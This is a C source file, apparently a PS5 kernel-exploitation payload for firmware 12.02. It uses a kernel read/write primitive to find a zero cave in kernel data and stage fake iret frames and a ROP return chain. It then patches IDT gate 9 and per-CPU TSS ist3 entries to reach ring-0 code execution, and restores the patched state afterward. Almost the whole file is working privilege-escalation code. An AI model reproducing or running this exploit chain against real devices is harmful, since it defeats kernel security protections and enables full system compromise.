/* minchain2 - rung 4c-2: the no-TF entry/return discriminator.
 *
 * Freez #7 (minchain, rung 4c) froze during the deliberate int9 entry,
 * eliminating the passive window, bare pivot, gdb session, race, and
 * pinning classes. Two candidates remain: the int9 ENTRY path or the
 * #DB RETURN path. This rung removes the return path entirely:
 *
 *   - eflags = 0x2 (IF only - NO TF - no #DB fires after the target)
 *   - the v1 gate and ist4 are NOT patched at all (nothing can fire
 *     them) - the footprint shrinks to ONE gate (v9) + ist3 on the
 *     affinity-masked CPUs
 *   - the return: the target's own 'ret' pops a staged return chain:
 *       [cave+0x700] = swapgs_add_rsp_iret  (the SYMMETRIC swapgs:
 *         the entry pivot swapped user->kernel GS; this swaps back -
 *         without it the CPL3 landing would run with the kernel GS
 *         and the SDK's gs-based TLS would fault)
 *       the gadget's add rsp,0xe8 lands at cave+0x7f0, where the
 *       5-qword CPL0->CPL3 iret frame is staged:
 *       [chain_landed][cs=0x43][rflags=0x202][landing_rsp][ss=0x3b]
 *   - chain_landed(): a C landing function (entered by iretq, never
 *     returns) - sets the flag, runs finish_chain() (verify+restore),
 *     exit(0)
 *
 * Verdict logic: survives + the cookie lands = the int9 ENTRY path is
 * FINE and the #DB return path was the rung-4c killer (the port uses
 * the no-TF design - it suits the one-shot port perfectly). Freezes
 * too = the ENTRY machinery itself is broken on this console - a deep
 * finding against the whole kstuff frame design.
 *
 * Full entry derivation (closed 100% against r0run.asm + trap_state.h
 * + the FreeBSD 11 doreti tail; see docs/16):
 *   int 9 -> v9 gate (DPL3, ist3=cave+0xe0) -> 5-qword push (rsp=cave+0xb8)
 *   -> pivot: swapgs; add rsp,0xe8 -> rsp=cave+0x1a0=tframe
 *   -> iretq pops [doreti_iret][0x20][2][kframe] -> CPL0, rsp=kframe
 *   -> bare iretq at kframe pops [rip=TARGET][0x20][rflags=0x2][rsp=cave+0x700]
 *   -> the TARGET at CPL0: mov [rdi],rax (the cookie), ret
 *   -> ret pops [cave+0x700]=swapgs_add_rsp_iret -> swapgs; add rsp,0xe8
 *   -> rsp=cave+0x7f0 -> iretq pops the staged landing frame -> CPL3
 */
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <stdlib.h>
#include <ps5/payload.h>

#include "../r0gdb.h"
#include "../offsets.h"
#include "../../gdb_stub/trap_state.h"
#include "../../lib/r0gdb-bootstrap.h"

extern uint64_t kframe;
extern uint64_t uretframe;
extern uint64_t kdata_base;

extern char __image_end[];

extern int sysctl(int *, unsigned int, void *, unsigned long *, const void *,
                  unsigned long);
int __sysctl(const int *name, unsigned int namelen, void *oldp,
             unsigned long *oldlenp, const void *newp, unsigned long newlen);
int __sysctl(const int *name, unsigned int namelen, void *oldp,
             unsigned long *oldlenp, const void *newp, unsigned long newlen)
{
    return sysctl((int *)name, namelen, oldp, oldlenp, newp, newlen);
}

#define VEC_V9   9
#define TSS_STRIDE 0x68
#define IST3_OFF 0x34
#define COOKIE   UINT64_C(0xCAFE133700314C4D)

/* the cave: the frames span +0xe0..+0x518, the cookie at +0x600, the
 * return chain at +0x700 and the landing frame at +0x7f0..+0x818 */
#define CAVE_SZ  0x900
#define CAVE_SCAN_BASE_OFF 0x2ea0000
#define CAVE_SCAN_LEN      0x40000

static unsigned char buf[0x1000];

/* ---- the finish_chain state (file scope: chain_landed needs it) ---- */
static uint64_t g_cave;
static uint64_t g_gate9;
static uint64_t g9_lo, g9_hi;
static uint64_t g_ist3o[16];
static int g_cpus[16];
static int g_nc;
static int g_patch_started;
static volatile int g_landed;
static payload_args_t *g_pargs;

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type,
                        uint8_t dpl, int present, uint64_t *lo, uint64_t *hi)
{
    *lo = (off & 0xFFFF)
        | ((uint64_t)sel << 16)
        | ((uint64_t)(ist & 7) << 32)
        | ((uint64_t)(type & 0xF) << 40)
        | ((uint64_t)(dpl & 3) << 45)
        | ((uint64_t)(present ? 1 : 0) << 47)
        | (((off >> 16) & 0xFFFF) << 48);
    *hi = (off >> 32) & 0xFFFFFFFFULL;
}

static long rs5(long nr, long a, long b, long c, long d, long e)
{
    long ret;
    register long r10 __asm__("r10") = d;
    register long r8 __asm__("r8") = e;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(nr), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8)
                     : "rcx", "r11", "memory");
    return ret;
}

static uint64_t find_cave(uint64_t base, uint64_t len, size_t need)
{
    for(uint64_t off = 0; off + need <= len; off += 8) {
        if(copyout(buf, base + off, need) != (ssize_t)need)
            continue;
        int ok = 1;
        for(size_t i = 0; i < need; i++)
            if(buf[i]) { ok = 0; break; }
        if(ok)
            return base + off;
    }
    return 0;
}

/* the landing stack for the CPL3 iret return */
static uint64_t landing_stack[512];

/* ---- finish_chain: the [C7]/[C8]/[C9]/[CX] flow, callable from the
 * landing function OR from main (the unreachable run_in_kernel-return
 * safety path) ---- */
static int finish_chain(void)
{
    int rc_final = 0;

    /* [C7] verify the cookie */
    uint64_t got = 0;
    if(g_cave)
        copyout(&got, g_cave + 0x600, 8);
    printf("[C7] cookie: got=0x%llx want=0x%llx %s%s\n",
           (unsigned long long)got, (unsigned long long)COOKIE,
           got == COOKIE ? "VERIFIED" : "MISMATCH",
           g_landed ? " (via the landing)" : "");
    fflush(stdout);
    if(got != COOKIE)
        rc_final = 9;

    /* [C8] the best-effort restore (the v9 gate + the ist3 slots) */
    int restore_complete = !g_patch_started;
    if(g_patch_started) {
        int wfail = 0, rfail = 0;
        wfail += (copyin(g_gate9, &g9_lo, 8) != 8);
        wfail += (copyin(g_gate9 + 8, &g9_hi, 8) != 8);
        for(int i = 0; i < g_nc; i++) {
            uint64_t a3 = offsets.tss_array +
                (uint64_t)g_cpus[i] * TSS_STRIDE + IST3_OFF;
            wfail += (copyin(a3, &g_ist3o[g_cpus[i]], 8) != 8);
        }
        unsigned char chk[16];
        uint64_t c_lo, c_hi, c_ist3;
        int ok9 = 0, oki = 1;
        if(copyout(chk, g_gate9, 16) == 16) {
            memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
            ok9 = (c_lo == g9_lo && c_hi == g9_hi);
        } else rfail++;
        for(int i = 0; i < g_nc; i++) {
            uint64_t a3 = offsets.tss_array +
                (uint64_t)g_cpus[i] * TSS_STRIDE + IST3_OFF;
            if(copyout(&c_ist3, a3, 8) == 8) {
                if(c_ist3 != g_ist3o[g_cpus[i]]) {
                    oki = 0;
                    printf("[C8] cpu %d ist3 readback mismatch\n", g_cpus[i]);
                }
            } else { oki = 0; rfail++; }
        }
        printf("[C8] restore: writes_failed=%d readbacks_failed=%d "
               "g9=%d ist(all %d cpus)=%d\n", wfail, rfail, ok9, g_nc, oki);
        fflush(stdout);
        restore_complete = !wfail && !rfail && ok9 && oki;
        if(!restore_complete) {
            printf("[C8] !!! RESTORE INCOMPLETE - LIVE PATCHED STATE - "
                   "POWER-CYCLE THE CONSOLE NOW !!!\n");
            fflush(stdout);
            if(rc_final == 0)
                rc_final = 8;
        }
    } else {
        printf("[C8] nothing was patched - no restore needed\n");
        fflush(stdout);
    }

    /* [C9] the cave zero-back ONLY if the restore verified (a live gate
     * may still pivot onto the cave stacks - keep them mapped) */
    if(g_cave && restore_complete) {
        memset(buf, 0, sizeof(buf));
        for(uint64_t o = 0; o < CAVE_SZ; o += sizeof(buf)) {
            size_t n = (CAVE_SZ - o < sizeof(buf)) ? (size_t)(CAVE_SZ - o)
                                                   : sizeof(buf);
            if(copyin(g_cave + o, buf, n) != (ssize_t)n) {
                printf("[C9] FAIL: zero-back at +%llx (best-effort)\n",
                       (unsigned long long)o);
                fflush(stdout);
                break;
            }
        }
        printf("[C9] cave zeroed back\n");
        fflush(stdout);
    } else if(g_cave) {
        printf("[C9] cave retained (restore not verified)\n");
        fflush(stdout);
    }

    printf("[CX] minchain2 complete: landed=%d cookie %s, restore %s, rc=%d "
           "- the client verifies the console next\n",
           g_landed,
           got == COOKIE ? "OK" : "FAILED",
           (!g_patch_started || restore_complete) ? "OK" : "INCOMPLETE",
           rc_final);
    fflush(stdout);

    if(g_pargs)
        *g_pargs->payloadout = rc_final ? rc_final : 0;
    return rc_final;
}

/* ---- the CPL3 landing function: entered by the staged iretq after the
 * target's return chain. NEVER returns (it was not called - there is
 * no return address); runs the finish flow and exits. ---- */
static void __attribute__((used, noinline)) chain_landed(void)
{
    g_landed = 1;
    printf("[L1] LANDED at CPL3 via the staged return chain\n");
    fflush(stdout);
    int rc = finish_chain();
    exit(rc);
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

    signal(SIGPIPE, SIG_IGN);

    payload_args_t *pargs = payload_get_args();
    if(!pargs || !pargs->sys_dynlib_dlsym || !pargs->rwpipe || !pargs->rwpair ||
       !pargs->payloadout || !pargs->kpipe_addr || !pargs->kdata_base_addr) {
        printf("[D1] FAIL: incomplete payload_args\n");
        fflush(stdout);
        return 2;
    }
    *pargs->payloadout = 1;
    g_pargs = pargs;

    printf("[D1] args=0x%lx kpipe=0x%lx kdata=0x%lx\n",
           (unsigned long)pargs,
           (unsigned long)pargs->kpipe_addr,
           (unsigned long)pargs->kdata_base_addr);
    fflush(stdout);

    struct r0gdb_bootstrap bootstrap = {
        .magic = R0GDB_BOOTSTRAP_MAGIC,
        .rwpipe = { pargs->rwpipe[0], pargs->rwpipe[1] },
        .kpipe_addr = (uint64_t)pargs->kpipe_addr,
    };

    uint32_t fw = r0gdb_get_fw_version();
    printf("[D3] fw_version=0x%08x (12.02 expects 0x12020000)\n", fw);
    fflush(stdout);

    int rc = r0gdb_init(pargs->sys_dynlib_dlsym,
                        pargs->rwpair[0], pargs->rwpair[1],
                        (uintptr_t)&bootstrap, (uintptr_t)pargs->kdata_base_addr);
    printf("[D4] r0gdb_init rc=%d\n", rc);
    fflush(stdout);
    if(rc != 0) {
        *pargs->payloadout = rc;
        return rc;
    }

    /* [C1] the affinity mask (pinprobe-verified invocation) */
    {
        long tid = -1;
        if(rs5(432, (long)&tid, 0, 0, 0, 0) != 0 || tid < 0) {
            printf("[C1] FAIL: thr_self\n");
            fflush(stdout);
            return 3;
        }
        unsigned char mask[16];
        memset(mask, 0, sizeof(mask));
        long r;
        {
            register long r10 __asm__("r10") = 16;
            register long r8 __asm__("r8") = (long)mask;
            __asm__ volatile("syscall"
                             : "=a"(r)
                             : "a"(487L), "D"(2L), "S"(1L), "d"(tid),
                               "r"(r10), "r"(r8)
                             : "rcx", "r11", "memory");
        }
        if(r != 0) {
            printf("[C1] FAIL: getaffinity ret=%ld\n", r);
            fflush(stdout);
            return 3;
        }
        for(int cpu = 0; cpu < 16; cpu++)
            if(mask[cpu >> 3] & (1 << (cpu & 7)))
                g_cpus[g_nc++] = cpu;
        printf("[C1] tid=%ld mask=%02x%02x -> %d cpus:", tid, mask[0], mask[1],
               g_nc);
        for(int i = 0; i < g_nc; i++)
            printf(" %d", g_cpus[i]);
        printf("\n");
        fflush(stdout);
        if(g_nc == 0) {
            printf("[C1] FAIL: empty mask\n");
            fflush(stdout);
            return 3;
        }
    }

    /* [C2] the cave */
    g_cave = find_cave(kdata_base + CAVE_SCAN_BASE_OFF, CAVE_SCAN_LEN,
                       CAVE_SZ);
    if(!g_cave) {
        printf("[C2] FAIL: no zero cave\n");
        fflush(stdout);
        return 4;
    }
    printf("[C2] cave=0x%llx (kdata+%llx)\n",
           (unsigned long long)g_cave,
           (unsigned long long)(g_cave - kdata_base));
    fflush(stdout);
    uint64_t cave = g_cave;

    /* [C3] the frames + THE RETURN CHAIN (the no-TF design's addition) */
    uint64_t tframe = cave + 0x1a0;
    kframe = cave + 0x1c8;
    uretframe = cave + 0x2b0;
    uint64_t pivot = offsets.swapgs_add_rsp_iret;
    kwrite20(tframe, offsets.doreti_iret, 0x20, 0);
    kwrite20(tframe + 16, 2, kframe, 0);
    kwrite20(cave + 0x408, 0, offsets.doreti_iret, 0);
    kwrite20(cave + 0x500, offsets.rep_movsb_pop_rbp_ret, 0x20, 0);
    kwrite20(cave + 0x510, 0x40002, cave + 0x408, 0);

    /* the return chain at the target's rsp:
     *   [cave+0x700] = swapgs_add_rsp_iret (the ret's pop: the SYMMETRIC
     *                 swapgs back to the user GS + the +0xe8 skip)
     *   the gadget's add rsp,0xe8 from rsp=cave+0x708 lands at cave+0x7f0:
     *   [cave+0x7f0..0x818) = the CPL0->CPL3 iret frame */
    uint64_t landing_rsp = (uint64_t)(landing_stack + 480);
    uint64_t ret_chain[6];
    ret_chain[0] = pivot;                 /* cave+0x700: the ret's target */
    /* cave+0x7f0: rip, cs, rflags, rsp, ss (the 5-qword iret frame) */
    uint64_t iret_frame[5] = {
        (uint64_t)chain_landed,           /* rip */
        0x43,                             /* cs (user) */
        0x202,                            /* rflags */
        landing_rsp,                      /* rsp */
        0x3b,                             /* ss (user) */
    };
    if(copyin(cave + 0x700, ret_chain, 8) != 8 ||
       copyin(cave + 0x7f0, iret_frame, 40) != 40) {
        printf("[C3] FAIL: return-chain staging\n");
        fflush(stdout);
        return 4;
    }
    printf("[C3] frames + return chain staged (pivot=0x%llx "
           "landing=0x%llx landing_rsp=0x%llx)\n",
           (unsigned long long)pivot,
           (unsigned long long)(uint64_t)chain_landed,
           (unsigned long long)landing_rsp);
    fflush(stdout);

    /* [C4] save the originals: the v9 gate + the masked CPUs' ist3 */
    g_gate9 = offsets.idt + (uint64_t)VEC_V9 * 16;
    unsigned char g9o[16];
    if(copyout(g9o, g_gate9, 16) != 16) {
        printf("[C4] FAIL: gate save\n");
        fflush(stdout);
        return 5;
    }
    memcpy(&g9_lo, g9o, 8); memcpy(&g9_hi, g9o + 8, 8);
    uint16_t kcs = (uint16_t)(g9_lo >> 16);
    for(int i = 0; i < g_nc; i++) {
        uint64_t a3 = offsets.tss_array + (uint64_t)g_cpus[i] * TSS_STRIDE + IST3_OFF;
        if(copyout(&g_ist3o[g_cpus[i]], a3, 8) != 8) {
            printf("[C4] FAIL: ist3 save (cpu %d)\n", g_cpus[i]);
            fflush(stdout);
            return 5;
        }
    }
    printf("[C4] saved: g9(lo=0x%llx hi=0x%llx) kcs=0x%x; %d cpus' ist3\n",
           (unsigned long long)g9_lo, (unsigned long long)g9_hi, kcs, g_nc);
    fflush(stdout);
    if(!kcs) {
        printf("[C4] FAIL: implausible selector\n");
        fflush(stdout);
        return 5;
    }

    /* [C5] the patch: ONE gate (v9) + ist3 on the masked CPUs */
    int patch_started = 0;
    uint64_t n9_lo, n9_hi;
    gate_encode(pivot, kcs, 3, 0xE, 3, 1, &n9_lo, &n9_hi); /* v9: DPL3, ist3 */
    uint64_t ist3v = cave + 0xe0;

    if(copyin(g_gate9 + 8, &n9_hi, 8) != 8) {
        printf("[C5] FAIL: gate9 hi\n"); fflush(stdout); return 6;
    }
    patch_started = 1;
    if(copyin(g_gate9, &n9_lo, 8) != 8) {
        printf("[C5] FAIL: gate9 lo\n"); fflush(stdout);
        g_patch_started = 1; finish_chain(); return 6;
    }
    for(int i = 0; i < g_nc; i++) {
        uint64_t a3 = offsets.tss_array + (uint64_t)g_cpus[i] * TSS_STRIDE + IST3_OFF;
        if(copyin(a3, &ist3v, 8) != 8) {
            printf("[C5] FAIL: ist3 cpu %d\n", g_cpus[i]); fflush(stdout);
            g_patch_started = 1; finish_chain(); return 6;
        }
    }
    g_patch_started = patch_started;

    /* readback verify (a failure restores before exiting) */
    {
        unsigned char chk[16];
        uint64_t c_lo, c_hi, c_ist3;
        int bad = 0;
        if(copyout(chk, g_gate9, 16) == 16) {
            memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
            if(c_lo != n9_lo || c_hi != n9_hi) bad = 1;
        } else bad = 1;
        for(int i = 0; i < g_nc && !bad; i++) {
            uint64_t a3 = offsets.tss_array + (uint64_t)g_cpus[i] * TSS_STRIDE + IST3_OFF;
            if(copyout(&c_ist3, a3, 8) != 8 || c_ist3 != ist3v) bad = 1;
        }
        if(bad) {
            printf("[C5] FAIL: readback\n"); fflush(stdout);
            finish_chain(); return 6;
        }
    }
    printf("[C5] patch verified (g9 + %d cpus' ist3) - ENTERING (no TF)\n",
           g_nc);
    fflush(stdout);

    /* [C6] the deliberate one-shot, NO TF: the target's own ret drives
     * the return through the staged chain; run_in_kernel will NOT
     * return here (the landing function takes over). The code below is
     * the unreachable safety path. */
    {
        struct regs regs;
        memset(&regs, 0, sizeof(regs));
        regs.rax = COOKIE;
        regs.rdi = cave + 0x600;
        regs.rip = offsets.store_rax_rdi;
        regs.rsp = cave + 0x700;
        regs.eflags = 0x2;                 /* IF ONLY - no TF, no #DB */
        printf("[C6] run_in_kernel: rip=0x%llx rdi=0x%llx rax=0x%llx "
               "rflags=0x2 (no TF) - the landing takes over\n",
               (unsigned long long)regs.rip, (unsigned long long)regs.rdi,
               (unsigned long long)regs.rax);
        fflush(stdout);

        run_in_kernel(&regs);
    }

    /* unreachable in the no-TF design (the landing exits); kept as the
     * safety path if the machinery ever falls through */
    printf("[C6] run_in_kernel RETURNED (unexpected in the no-TF design)\n");
    fflush(stdout);
    return finish_chain();
}
